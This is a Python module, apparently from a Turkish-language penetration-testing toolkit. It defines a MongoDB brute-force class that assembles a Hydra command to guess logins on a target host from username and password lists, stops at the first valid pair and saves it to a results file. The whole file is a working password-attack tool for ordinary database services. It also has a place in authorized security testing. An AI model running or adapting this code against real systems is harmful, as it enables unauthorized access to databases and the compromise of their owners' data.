from .base import BruteForceBase
from config import Ayarlar

class MongoDBBruteForce(BruteForceBase):
    def __init__(self, hedef_ip, hedef_port=27017):
        super().__init__(hedef_ip, hedef_port, "MongoDB")
    
    def _hydra_tipi(self):
        return "mongodb"
    
    def _komut_olustur(self, kullanici_listesi, sifre_listesi):
        komut = [
            "hydra",
            "-L", kullanici_listesi,
            "-P", sifre_listesi,
            self.hedef_ip,
            self._hydra_tipi(),
            "-s", str(self.hedef_port),
            "-t", str(Ayarlar.HYDRA_THREADS),
            "-f",
            "-o", f"sonuclar/{self.servis_adi.lower()}_sonuclari.txt"
        ]
        return komut